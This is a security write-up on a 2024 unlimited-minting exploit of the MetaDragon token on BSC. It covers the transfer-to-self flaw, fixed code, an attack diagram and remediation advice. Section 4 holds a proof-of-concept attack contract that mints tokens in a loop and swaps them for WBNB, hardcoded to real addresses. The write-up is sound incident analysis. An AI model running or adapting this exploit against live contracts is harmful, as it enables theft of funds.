# MetaDragon — Unlimited Minting via `transfer()` to Contract Address Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | MetaDragon |
| **Chain** | BSC |
| **Loss** | ~$180,000 |
| **Vulnerable Contract** | [MetaToken 0xEF1f39d8](https://bscscan.com/address/0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f) |
| **Root Cause** | In the `transfer(to, tokenId)` function, when `to == address(this) || to == erc721`, `transform(value)` is called, triggering unlimited minting. The attacker iterated token IDs 0–39 to mass-mint MetaTokens and swap them for WBNB |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/MetaDragon_exp.sol) |

---

## 1. Vulnerability Overview

MetaDragon's `transfer()` function calls `transform(value)` to mint new MetaTokens when the recipient is the contract itself (`address(this)`) or the ERC721 contract address. Due to the absence of any access control on this condition, the attacker repeatedly called the function 40 times — sending token IDs 0 through 39 to the meta contract address — to mass-mint MetaTokens and swap them for WBNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: unlimited minting when transferring to contract address
contract MetaToken {
    address public erc721;

    function transfer(address to, uint256 value) external returns (bool) {
        if (to == address(this) || to == erc721) {
            // Unlimited minting trigger — no access control
            transform(value);
        } else {
            _transfer(msg.sender, to, value);
        }
        return true;
    }

    function transform(uint256 tokenId) internal {
        // Mint MetaToken based on tokenId
        _mint(msg.sender, mintAmount);  // ← Anyone can trigger
    }
}

// ✅ Safe code: access control on transform
function transfer(address to, uint256 value) external returns (bool) {
    if (to == address(this) || to == erc721) {
        // Only owner can trigger transform
        require(msg.sender == owner || approvedTransformers[msg.sender], "not authorized");
        transform(value);
    } else {
        _transfer(msg.sender, to, value);
    }
    return true;
}
```

### On-chain Original Code

Source: Sourcify verified

```solidity
// File: MetaDragon_decompiled.sol
contract MetaDragon {
    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] for (tokenId = 0; tokenId < 40; tokenId++)
  │
  ├─→ [2] MetaToken.transfer(address(MetaToken), tokenId)
  │         └─ to == address(this) condition satisfied
  │         └─ transform(tokenId) called → MetaToken minted
  │
  ├─→ [3] Large MetaToken balance accumulated over 40 iterations
  │
  ├─→ [4] MetaToken.approve(router, maxAmount)
  │
  ├─→ [5] MetaToken → WBNB swap (Uniswap V2)
  │
  └─→ [6] ~$180K worth of WBNB drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IUniswapV2Router {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn, uint256 amountOutMin,
        address[] calldata path, address to, uint256 deadline
    ) external;
}

contract AttackContract {
    IERC20  constant meta   = IERC20(0xEF1f39d8391cdDcaee62b8b383cB992F46a6ce4f);
    IERC20  constant WBNB   = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IUniswapV2Router constant router = IUniswapV2Router(/* PancakeSwap Router */);

    function testExploit() external {
        // [1] Iterate token IDs 0-39 to trigger minting
        for (uint256 tokenId = 0; tokenId < 40; tokenId++) {
            // transfer(address(meta), tokenId) → calls transform(tokenId)
            meta.transfer(address(meta), tokenId);
        }

        // [2] Check minted MetaToken balance
        uint256 metaBal = meta.balanceOf(address(this));

        // [3] Swap MetaToken → WBNB
        meta.approve(address(router), metaBal);
        address[] memory path = new address[](2);
        path[0] = address(meta);
        path[1] = address(WBNB);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            metaBal, 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Business Logic Flaw (unlimited minting via transfer condition) |
| **CWE** | CWE-840: Business Logic Errors |
| **Attack Vector** | External (special address condition trigger via transfer) |
| **DApp Classification** | NFT/Token hybrid contract |
| **Impact** | Infinite MetaToken minting → WBNB drain (~$180K) |

## 6. Remediation Recommendations

1. **Access control on transform**: Restrict `transform()` so only the owner or approved addresses can trigger it
2. **Block contract address transfers**: Separate `to == address(this)` transfers into a dedicated function with proper authorization
3. **Mint cap**: Enforce a total supply ceiling to prevent infinite minting
4. **NFT/ERC20 interaction audit**: Contracts mixing both standards must thoroughly audit all interaction paths

## 7. Lessons Learned

- The pattern where special behavior is triggered when the `transfer()` recipient is the contract itself is analogous to BBT (2024-03)'s `setRegistry` pattern.
- Hybrid tokens combining ERC20 and ERC721 (ERC-404 family) must always validate paths that deviate from standard behavior.
- When internal minting functions like `transform()` can be triggered via external `transfer()` conditions, infinite minting becomes possible.